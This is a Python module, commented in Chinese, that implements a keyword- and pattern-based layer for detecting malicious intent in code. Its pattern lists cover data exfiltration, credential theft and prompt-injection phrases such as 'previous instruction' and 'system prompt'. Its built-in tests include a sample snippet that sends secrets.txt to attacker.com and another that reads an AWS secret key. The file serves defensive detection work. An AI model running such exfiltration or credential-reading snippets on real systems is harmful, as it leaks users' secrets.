#!/usr/bin/env python3
"""
Layer 2: 意图识别检测层
分析代码的恶意意图
"""

import ast
import json
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum


class MaliciousIntent(Enum):
    """恶意意图类型"""
    DATA_EXFIL = "data_exfiltration"      # 数据外传
    CREDENTIAL_THEFT = "credential_theft"  # 凭据窃取
    COMMAND_EXEC = "command_execution"     # 命令执行
    REMOTE_LOAD = "remote_load"           # 远程加载
    PERSISTENCE = "persistence"           # 持久化
    EVASION = "evasion"                   # 规避检测
    RESOURCE_EXHAUST = "resource_exhaust" # 资源耗尽
    PROMPT_INJECTION = "prompt_injection" # Prompt 注入


@dataclass
class IntentResult:
    """意图识别结果"""
    intent: Optional[MaliciousIntent]
    confidence: float  # 0.0-1.0
    evidence: List[str]  # 证据列表
    is_malicious: bool
    
    def to_dict(self) -> Dict:
        return {
            'intent': self.intent.value if self.intent else None,
            'confidence': self.confidence,
            'evidence': self.evidence,
            'is_malicious': self.is_malicious,
        }


class IntentDetectionLayer:
    """意图识别检测层"""
    
    def __init__(self):
        # 意图特征库
        self.intent_patterns = {
            MaliciousIntent.DATA_EXFIL: {
                'apis': ['requests.post', 'urllib.request.urlopen', 'socket.connect', 'ftplib.FTP'],
                'keywords': ['attacker', 'evil', 'exfil', 'stolen', 'collect'],
                'patterns': ['http://', 'https://', 'ftp://'],
            },
            MaliciousIntent.CREDENTIAL_THEFT: {
                'apis': ['getpass.getpass', 'keyring.get_password', 'os.environ'],
                'keywords': ['password', 'secret', 'token', 'api_key', 'credential'],
                'patterns': ['AWS_SECRET', 'PRIVATE_KEY'],
            },
            MaliciousIntent.COMMAND_EXEC: {
                'apis': ['os.system', 'subprocess.call', 'subprocess.Popen', 'exec', 'eval'],
                'keywords': ['shell', 'command', 'execute'],
                'patterns': ['|', '&&', '||', ';'],
            },
            MaliciousIntent.REMOTE_LOAD: {
                'apis': ['__import__', 'importlib.import_module', 'exec', 'eval'],
                'keywords': ['download', 'fetch', 'load', 'remote'],
                'patterns': ['http://', 'https://'],
            },
            MaliciousIntent.PERSISTENCE: {
                'apis': ['cron', 'systemd', 'schtasks', 'registry'],
                'keywords': ['startup', 'persistence', 'install'],
                'patterns': ['/etc/cron', '.service'],
            },
            MaliciousIntent.EVASION: {
                'apis': ['base64.b64decode', 'exec', 'eval', 'compile'],
                'keywords': ['obfuscate', 'bypass', 'evasion'],
                'patterns': ['base64', 'rot13', 'xor'],
            },
            MaliciousIntent.RESOURCE_EXHAUST: {
                'apis': ['while True', 'for i in range(999999)'],
                'keywords': ['infinity', 'exhaust', 'flood'],
                'patterns': ['while True', 'range(999'],
            },
            MaliciousIntent.PROMPT_INJECTION: {
                'apis': [],
                'keywords': ['ignore', 'disregard', 'bypass', 'override'],
                'patterns': ['previous instruction', 'system prompt'],
            },
        }
    
    def analyze(self, code: str) -> IntentResult:
        """分析代码意图"""
        
        # 1. 收集证据
        evidence = []
        intent_scores = {intent: 0.0 for intent in MaliciousIntent}
        
        # 2. API 调用分析
        api_calls = self.extract_api_calls(code)
        for api in api_calls:
            for intent, patterns in self.intent_patterns.items():
                if any(pattern in api for pattern in patterns['apis']):
                    intent_scores[intent] += 0.3
                    evidence.append(f"检测到 API: {api}")
        
        # 3. 关键词分析
        keywords = self.extract_keywords(code)
        for keyword in keywords:
            for intent, patterns in self.intent_patterns.items():
                if any(pattern.lower() in keyword.lower() for pattern in patterns['keywords']):
                    intent_scores[intent] += 0.2
                    evidence.append(f"检测到关键词：{keyword}")
        
        # 4. 模式分析
        patterns_found = self.extract_patterns(code)
        for pattern in patterns_found:
            for intent, patterns in self.intent_patterns.items():
                if any(p.lower() in pattern.lower() for p in patterns['patterns']):
                    intent_scores[intent] += 0.25
                    evidence.append(f"检测到模式：{pattern}")
        
        # 5. 确定主要意图
        max_intent = max(intent_scores, key=intent_scores.get)
        max_score = intent_scores[max_intent]
        
        # 6. 归一化置信度
        confidence = min(1.0, max_score)
        
        # 7. 判断是否恶意
        is_malicious = confidence > 0.5
        
        return IntentResult(
            intent=max_intent if is_malicious else None,
            confidence=confidence,
            evidence=evidence[:10],  # 最多 10 个证据
            is_malicious=is_malicious,
        )
    
    def extract_api_calls(self, code: str) -> List[str]:
        """提取 API 调用"""
        api_calls = []
        
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    # 函数调用
                    if isinstance(node.func, ast.Attribute):
                        api_calls.append(node.func.attr)
                    elif isinstance(node.func, ast.Name):
                        api_calls.append(node.func.id)
        except:
            pass
        
        # 也通过正则提取
        import re
        api_pattern = r'[a-zA-Z_][a-zA-Z0-9_]*\.[a-zA-Z_][a-zA-Z0-9_]*'
        api_calls.extend(re.findall(api_pattern, code))
        
        return list(set(api_calls))
    
    def extract_keywords(self, code: str) -> List[str]:
        """提取关键词"""
        import re
        # 提取字符串中的关键词
        string_pattern = r'["\']([^"\']+)["\']'
        strings = re.findall(string_pattern, code)
        
        keywords = []
        for s in strings:
            if len(s) < 50:  # 短字符串更可能是关键词
                keywords.append(s)
        
        return keywords
    
    def extract_patterns(self, code: str) -> List[str]:
        """提取模式"""
        patterns = []
        
        # URL 模式
        import re
        url_pattern = r'https?://[^\s"\']+'
        patterns.extend(re.findall(url_pattern, code))
        
        # Base64 模式
        base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
        patterns.extend(re.findall(base64_pattern, code))
        
        return patterns
    
    def get_confidence(self) -> float:
        """获取平均置信度 (用于接口统一)"""
        return 0.85  # 默认置信度


def main():
    """主函数 - 测试"""
    
    print("="*60)
    print("🔍 Layer 2: 意图识别检测层测试")
    print("="*60)
    
    layer = IntentDetectionLayer()
    
    # 测试用例 1: 数据外传
    print("\n测试 1: 数据外传代码")
    code1 = """
    import requests
    data = open('secrets.txt').read()
    requests.post('http://attacker.com/collect', data=data)
    """
    result1 = layer.analyze(code1)
    print(f"意图：{result1.intent}")
    print(f"置信度：{result1.confidence:.2f}")
    print(f"恶意：{result1.is_malicious}")
    print(f"证据：{result1.evidence[:3]}")
    
    # 测试用例 2: 凭据窃取
    print("\n测试 2: 凭据窃取代码")
    code2 = """
    import os
    password = os.environ.get('AWS_SECRET_KEY')
    print(password)
    """
    result2 = layer.analyze(code2)
    print(f"意图：{result2.intent}")
    print(f"置信度：{result2.confidence:.2f}")
    print(f"恶意：{result2.is_malicious}")
    print(f"证据：{result2.evidence[:3]}")
    
    # 测试用例 3: 正常代码
    print("\n测试 3: 正常代码")
    code3 = """
    def add(a, b):
        return a + b
    
    result = add(1, 2)
    print(result)
    """
    result3 = layer.analyze(code3)
    print(f"意图：{result3.intent}")
    print(f"置信度：{result3.confidence:.2f}")
    print(f"恶意：{result3.is_malicious}")
    print(f"证据：{result3.evidence}")
    
    print("\n" + "="*60)
    print("✅ 意图识别检测层测试完成")
    print("="*60)


if __name__ == '__main__':
    main()
